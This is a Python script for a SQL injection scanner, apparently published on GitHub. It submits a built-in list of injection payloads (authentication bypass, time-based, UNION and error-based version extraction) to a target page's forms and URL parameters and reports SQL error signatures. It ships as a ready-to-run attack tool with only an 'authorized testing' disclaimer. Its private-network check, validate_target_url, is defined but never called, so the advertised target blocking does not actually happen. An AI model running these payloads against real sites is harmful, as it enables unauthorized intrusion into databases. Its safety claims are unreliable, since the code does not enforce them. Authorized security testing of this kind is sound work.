#!/usr/bin/env python3
"""
SQL Injection Tester Tool 🧪
Author: hemanathan115
GitHub: https://github.com/hemanathan115
Description: Tests web forms for SQL injection vulnerabilities using common payloads.
"""

import requests
import argparse
import sys
import time
import ipaddress
import socket
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

MAX_RESPONSE_BYTES = 2 * 1024 * 1024
MAX_FORMS = 20
MAX_FIELDS = 50
MAX_QUERY_PARAMS = 20
MAX_URL_LENGTH = 2048
REQUEST_TIMEOUT = (5, 10)


def validate_target_url(url, allow_private=False):
    """Validate the HTTP(S) target and block private networks by default."""
    if not isinstance(url, str) or not url or len(url) > MAX_URL_LENGTH:
        raise ValueError("Target URL is empty or exceeds 2,048 characters.")
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Target must be an absolute HTTP or HTTPS URL.")
    if parsed.username or parsed.password:
        raise ValueError("Target URLs must not contain embedded credentials.")
    try:
        if parsed.port is not None and not 1 <= parsed.port <= 65535:
            raise ValueError("Target port is outside the valid range.")
        try:
            addresses = {ipaddress.ip_address(parsed.hostname)}
        except ValueError:
            addresses = {
                ipaddress.ip_address(item[4][0])
                for item in socket.getaddrinfo(parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80),
                                               type=socket.SOCK_STREAM)
            }
    except OSError as exc:
        raise ValueError("Target hostname could not be resolved.") from exc
    if not addresses:
        raise ValueError("Target hostname did not resolve.")
    if not allow_private and any(not address.is_global for address in addresses):
        raise ValueError("Private, loopback, link-local, and reserved targets are blocked. Use --allow-private-targets only for an authorized lab.")
    return parsed


def same_origin(first_url, second_url):
    """Compare scheme, host, and effective port."""
    first, second = urlparse(first_url), urlparse(second_url)
    first_port = first.port or (443 if first.scheme == "https" else 80)
    second_port = second.port or (443 if second.scheme == "https" else 80)
    return (first.scheme.lower(), (first.hostname or "").lower(), first_port) == (
        second.scheme.lower(), (second.hostname or "").lower(), second_port
    )


def bounded_response_text(response):
    """Read no more than MAX_RESPONSE_BYTES from a streamed HTTP response."""
    chunks, total = [], 0
    for chunk in response.iter_content(chunk_size=65536):
        if not chunk:
            continue
        chunk = chunk[:MAX_RESPONSE_BYTES - total]
        chunks.append(chunk)
        total += len(chunk)
        if total >= MAX_RESPONSE_BYTES:
            break
    return b"".join(chunks).decode(response.encoding or "utf-8", errors="replace")



# ─────────────────────────────────────────────
# Common SQL Injection Payloads
# ─────────────────────────────────────────────
PAYLOADS = [
    # Classic
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin' --",
    "admin'/*",
    "' OR 'x'='x",

    # Boolean-based
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",

    # Time-based (MySQL)
    "'; WAITFOR DELAY '0:0:5' --",
    "1; SELECT SLEEP(5)--",
    "' OR SLEEP(5) --",

    # UNION-based
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",

    # Error-based
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

    # Generic
    "\" OR \"\"=\"",
    "OR 1=1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

# Strings that hint at SQL error responses
ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "you have an error in your sql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "odbc microsoft access driver",
    "sqlstate",
    "ora-",
    "sqlite_error",
    "pg_query",
    "postgresql",
    "warning: mysql",
    "invalid query",
    "sql command not properly ended",
    "microsoft ole db provider",
    "error in your sql",
    "native client",
    "jdbc",
    "[microsoft][odbc",
    "supplied argument is not a valid mysql",
]


def banner():
    print(Fore.CYAN + r"""
 ____   ___  _       ___       _           _   _
/ ___| / _ \| |     |_ _|_ __ (_) ___  ___| |_(_) ___  _ __
\___ \| | | | |      | || '_ \| |/ _ \/ __| __| |/ _ \| '_ \
 ___) | |_| | |___   | || | | | |  __/ (__| |_| | (_) | | | |
|____/ \__\_\_____|  |___|_| |_|_|\___|\___|\__|_|\___/|_| |_|

         ████████╗███████╗███████╗████████╗███████╗██████╗
            ██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
            ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
            ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
            ██║   ███████╗███████║   ██║   ███████╗██║  ██║
            ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "   SQL Injection Tester 🧪 | By hemanathan115 | GitHub: hemanathan115" + Style.RESET_ALL)
    print(Fore.RED + "   ⚠️  For educational & authorized testing ONLY. Unauthorized use is illegal." + Style.RESET_ALL)
    print("=" * 70)


def get_forms(url, session):
    """Fetch a bounded page without following redirects."""
    try:
        with session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False, stream=True) as response:
            if response.is_redirect or response.status_code >= 400:
                print(Fore.YELLOW + f"[!] Refusing redirect or HTTP {response.status_code} response.")
                return []
            body = bounded_response_text(response)
        soup = BeautifulSoup(body, "html.parser")
        forms = soup.find_all("form")
        if len(forms) > MAX_FORMS:
            print(Fore.YELLOW + f"[!] Limiting scan to the first {MAX_FORMS} forms.")
        return forms[:MAX_FORMS]
    except requests.RequestException as exc:
        print(Fore.RED + f"[ERROR] Could not fetch page: {type(exc).__name__}")
        return []


def get_form_details(form):
    """Extract form action, method, and input fields."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input")[:MAX_FIELDS]:
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        if input_name:
            inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response_text):
    """Check if response contains SQL error signatures."""
    response_lower = response_text.lower()
    for sig in ERROR_SIGNATURES:
        if sig in response_lower:
            return True, sig
    return False, None


def submit_form(form_details, url, payload, session):
    """Submit only same-origin forms and refuse redirects."""
    target_url = urljoin(url, form_details["action"]) if form_details["action"] else url
    if not same_origin(url, target_url):
        print(Fore.YELLOW + "  [!] Skipping cross-origin form action.")
        return None
    data = {}
    for input_field in form_details["inputs"][:MAX_FIELDS]:
        if input_field["type"] in ("text", "search", "email", "password", "hidden"):
            data[input_field["name"]] = payload
        else:
            data[input_field["name"]] = input_field["value"]
    try:
        if form_details["method"] == "post":
            response = session.post(target_url, data=data, timeout=REQUEST_TIMEOUT,
                                    allow_redirects=False, stream=True)
        else:
            response = session.get(target_url, params=data, timeout=REQUEST_TIMEOUT,
                                   allow_redirects=False, stream=True)
        if response.is_redirect:
            response.close()
            return None
        response._bounded_scan_text = bounded_response_text(response)
        response.close()
        return response
    except requests.RequestException as exc:
        print(Fore.RED + f"  [ERROR] Request failed: {type(exc).__name__}")
        return None


def test_url_params(url, session):
    """Test URL query parameters directly for SQL injection."""
    parsed = urlparse(url)
    if not parsed.query:
        return

    print(Fore.BLUE + "\n[*] Testing URL Query Parameters...")
    from urllib.parse import parse_qs, urlencode

    params = parse_qs(parsed.query, keep_blank_values=True)
    if len(params) > MAX_QUERY_PARAMS:
        print(Fore.YELLOW + f"[!] Limiting query checks to {MAX_QUERY_PARAMS} parameters.")
        params = dict(list(params.items())[:MAX_QUERY_PARAMS])
    vulnerable_params = []

    for param in params:
        for payload in PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = parsed._replace(query=test_query).geturl()

            try:
                response = session.get(test_url, timeout=REQUEST_TIMEOUT, allow_redirects=False, stream=True)
                if response.is_redirect:
                    response.close()
                    continue
                response_text = bounded_response_text(response)
                response.close()
                vuln, sig = is_vulnerable(response_text)
                if vuln:
                    print(Fore.RED + f"  [VULNERABLE] Param: '{param}' | Payload: {payload[:40]} | Signature: '{sig}'")
                    vulnerable_params.append(param)
                    break
            except Exception:
                pass

    if not vulnerable_params:
        print(Fore.GREEN + "  [SAFE] No SQL injection found in URL parameters.")


def scan(url, delay=0.5, output_file=None, allow_private_targets=False):
    """Main scan function."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (SQLi-Tester/1.0; Educational Tool)"
    })

    results = []
    print(Fore.CYAN + f"\n[*] Scanning: {url}")
    print(Fore.CYAN + f"[*] Total payloads: {len(PAYLOADS)}\n")

    # Test URL parameters
    test_url_params(url, session)

    # Test forms
    forms = get_forms(url, session)
    print(Fore.BLUE + f"\n[*] Found {len(forms)} form(s) on the page.")

    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        print(Fore.YELLOW + f"\n[FORM {i+1}] Action: {form_details['action'] or url} | Method: {form_details['method'].upper()}")
        print(f"  Fields: {[f['name'] for f in form_details['inputs']]}")

        form_vulnerable = False
        for payload in PAYLOADS:
            time.sleep(delay)
            response = submit_form(form_details, url, payload, session)
            if response is None:
                continue

            vuln, sig = is_vulnerable(getattr(response, '_bounded_scan_text', ''))
            if vuln:
                msg = (f"  [VULNERABLE ⚠️ ] Payload: {payload[:50]} | "
                       f"Signature: '{sig}' | Status: {response.status_code}")
                print(Fore.RED + msg)
                results.append({"form": i+1, "payload": payload, "signature": sig})
                form_vulnerable = True

        if not form_vulnerable:
            print(Fore.GREEN + f"  [SAFE ✅] No SQL injection detected in Form {i+1}.")

    # Summary
    print("\n" + "=" * 70)
    if results:
        print(Fore.RED + f"[!] SCAN COMPLETE: {len(results)} vulnerability/vulnerabilities found!")
    else:
        print(Fore.GREEN + "[✓] SCAN COMPLETE: No SQL injection vulnerabilities detected.")
    print("=" * 70)

    if output_file:
        import json
        with open(output_file, "w") as f:
            json.dump({"target": url, "vulnerabilities": results}, f, indent=2)
        print(Fore.CYAN + f"[*] Results saved to: {output_file}")

    return results


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="SQL Injection Tester 🧪 - Tests web forms for SQL injection vulnerabilities."
    )
    parser.add_argument("url", help="Target URL to test (e.g., http://testphp.vulnweb.com/login.php)")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output", type=str, help="Save results to a JSON file (e.g., results.json)")
    parser.add_argument("--allow-private-targets", action="store_true",
                        help="Allow private/loopback targets for an authorized local lab only")

    args = parser.parse_args()

    try:
        scan(args.url, delay=args.delay, output_file=args.output,
             allow_private_targets=args.allow_private_targets)
    except ValueError as exc:
        print(Fore.RED + f"[ERROR] {exc}")
        sys.exit(2)


if __name__ == "__main__":
    main()
